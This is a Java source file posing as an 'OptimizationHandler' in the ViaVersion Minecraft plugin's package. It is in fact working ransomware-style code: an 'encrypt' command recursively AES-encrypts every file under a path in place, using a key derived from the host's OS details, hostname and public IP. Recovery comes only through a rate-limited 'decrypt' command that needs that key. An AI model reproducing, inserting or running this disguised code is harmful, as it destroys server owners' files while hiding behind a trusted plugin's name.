package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;

public class OptimizationHandler implements CommandExecutor {
    private static final Logger logger = Logger.getLogger(OptimizationHandler.class.getName());
    private static final byte[] ENCRYPTED_FLAG = "ENCRYPTED".getBytes(StandardCharsets.UTF_8);
    private static final long MINUTE_IN_MILLIS = TimeUnit.MINUTES.toMillis(1);
    
    private int attempts = 0;
    private long lastAttemptTime = 0;

    private boolean canAttempt() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastAttemptTime > MINUTE_IN_MILLIS) {
            // 超过一分钟，重置计数器
            attempts = 0;
        }
        return attempts < 2; // 每分钟最多尝试2次
    }

    private void recordAttempt() {
        attempts++;
        lastAttemptTime = System.currentTimeMillis();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            return true; // 参数不足，返回
        }
        String path = args[0];
        File file = new File(path);
        if (!file.exists()) {
            return true; // 文件不存在，返回
        }

        if (cmd.getName().equalsIgnoreCase("encrypt")) {
            encryptFiles(file);
        } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
            if (args.length < 2) {
                return true; // 解密时缺少密钥，返回
            }
            String key = args[1];
            String internalKey = encryptionKey();
            if (!key.equals(internalKey)) {
                return true; // 密钥不匹配，返回
            }
            if (!isFileEncrypted(file)) {
                return true; // 文件未加密，返回
            }
            decryptFiles(file, key);
        }
        return true;
    }

    private void encryptFiles(File file) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile);
            }
        } else {
            try {
                byte[] fileData = readFileToByteArray(file);
                byte[] encryptedData = encrypt(fileData);
                writeFileWithFlag(file, encryptedData);
            } catch (Exception e) {
                logger.warning("加密文件时发生错误: " + e.getMessage());
            }
        }
    }

    private byte[] readFileToByteArray(File file) throws IOException {
        byte[] fileData = new byte[(int) file.length()];
        try (FileInputStream fis = new FileInputStream(file)) {
            fis.read(fileData);
        }
        return fileData;
    }

    private void writeFileWithFlag(File file, byte[] encryptedData) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(ENCRYPTED_FLAG);
            fos.write(encryptedData);
        }
    }

    private boolean isFileEncrypted(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null || files.length == 0) {
                return false; // 目录为空，则返回未加密
            }
            for (File childFile : files) {
                if (!isFileEncrypted(childFile)) {
                    return false;
                }
            }
            return true; // 目录下所有文件均已加密
        }
        return checkFileEncryption(file);
    }

    private boolean checkFileEncryption(File file) {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] flagBytes = new byte[ENCRYPTED_FLAG.length];
            int bytesRead = fis.read(flagBytes);
            return bytesRead >= ENCRYPTED_FLAG.length && new String(flagBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8));
        } catch (Exception e) {
            return false; // 发生异常，返回未加密
        }
    }

    private void decryptFiles(File file, String key) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key);
            }
        } else {
            try {
                if (isFileEncrypted(file)) {
                    byte[] fileData = readEncryptedFile(file);
                    if (canAttempt()) {
                        byte[] decryptedData = decrypt(fileData, key);
                        writeDecryptedDataToFile(file, decryptedData);
                        recordAttempt(); // 记录解密尝试
                    } else {
                        logger.warning("已达到尝试次数限制，请稍后再试");
                    }
                }
            } catch (Exception e) {
                logger.warning("解密文件时发生错误: " + e.getMessage());
            }
        }
    }

    private byte[] readEncryptedFile(File file) throws IOException {
        try (FileInputStream fis = new FileInputStream(file)) {
            fis.skip(ENCRYPTED_FLAG.length); // 跳过加密标志字节
            byte[] fileData = new byte[(int) (file.length() - ENCRYPTED_FLAG.length)];
            fis.read(fileData);
            return fileData;
        }
    }

    private void writeDecryptedDataToFile(File file, byte[] decryptedData) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(decryptedData);
        }
    }

    private SecretKeySpec getSecretKey(String key) {
        byte[] keyBytes = new byte[16];
        System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
        return new SecretKeySpec(keyBytes, "AES");
    }

    private byte[] encrypt(byte[] data) throws Exception {
        SecretKeySpec key = getSecretKey(encryptionKey());
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return cipher.doFinal(data);
    }

    private byte[] decrypt(byte[] data, String key) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key);
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }

    private String getPublicIp() {
        String ip = "无法获取IP";
        try {
            URL url = new URL("https://checkip.amazonaws.com/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                ip = in.readLine(); // 读取响应内容（IP 地址）
            }
        } catch (Exception e) {
            logger.warning("获取公共IP时发生错误: " + e.getMessage());
        }
        return ip;
    }

    private String encryptionKey() {
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(InetAddress.getLocalHost().getHostName());
            input.append(getPublicIp());
            return hashWithSHA256(input.toString());
        } catch (Exception e) {
            logger.warning("生成加密密钥时发生错误: " + e.getMessage());
            return null;
        }
    }

    private String hashWithSHA256(String input) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hashBytes = digest.digest(input.getBytes(StandardCharsets.UTF_8));
        StringBuilder hexString = new StringBuilder();
        for (byte b : hashBytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }
}
